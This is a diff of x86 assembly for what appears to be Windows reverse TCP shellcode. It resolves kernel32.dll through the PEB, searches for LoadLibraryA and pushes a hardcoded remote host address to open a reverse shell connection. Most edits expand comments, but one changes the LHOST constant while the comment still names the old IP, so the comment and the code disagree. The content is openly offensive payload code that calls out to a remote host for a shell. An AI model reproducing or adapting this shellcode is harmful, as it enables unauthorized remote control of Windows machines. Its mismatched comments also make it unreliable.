@@ -55,17 +55,19 @@ section .text
   _main:
     ; Using the PEB to find the kernel32.dll base address.
     xor eax, eax		; Zero out the EAX register.
-    mov eax, [fs:eax+0x30]	; Copy the address of the PEB to EAX.
-    mov eax, [eax+0x0c]		; Pointer to the loader data structure in PEB.
+    mov eax, [fs:eax+0x30]	; Copy the address of the PEB from the pointer
+				; located in the Thread Information Block (TEB).
+    mov eax, [eax+0x0c]		; Pointer to the loader data structure
+				; (PEB_LDR_DATA) at offset 0x0c in the PEB.
     mov esi, [eax+0x14]		; Copy 3rd entry in the module list.
                                 ; On Win7+ kernel32.dll is listed 3rd.
     lodsd			; Load DOUBLEWORD at address ESI into EAX.
-    xchg esi, eax		; Swap EAX and ESI.
+    xchg esi, eax		; Swap EAX and ESI registers.
     lodsd			; Load DOUBLEWORD a second time using ESI.
     mov eax, [eax+0x10]         ; Read the kernel32.dll base address at
 				; address EAX+0x10 and copy it in EAX.
     push eax			; Save the absolute base address of
-				; kernel32.dll in the stack.
+				; kernel32.dll onto the stack.
 
   ; Initiating search for LoadLibraryA().
   find_loadlibrary_func:
@@ -288,7 +290,7 @@ section .text
 
   ; Establish the reverse TCP connection to the remote host.
   establish_socket:
-    push 0xB102010A		; Push remote address (LHOST) onto the stack.
+    push 0x7B02010A		; Push remote address (LHOST) onto the stack.
 				; The IP here is hardcoded to '10.1.2.177'.
     mov eax, 0x697A0102		; The 2nd byte is set at 0x01 to avoid null
 				; byte. The Port is in the left most four
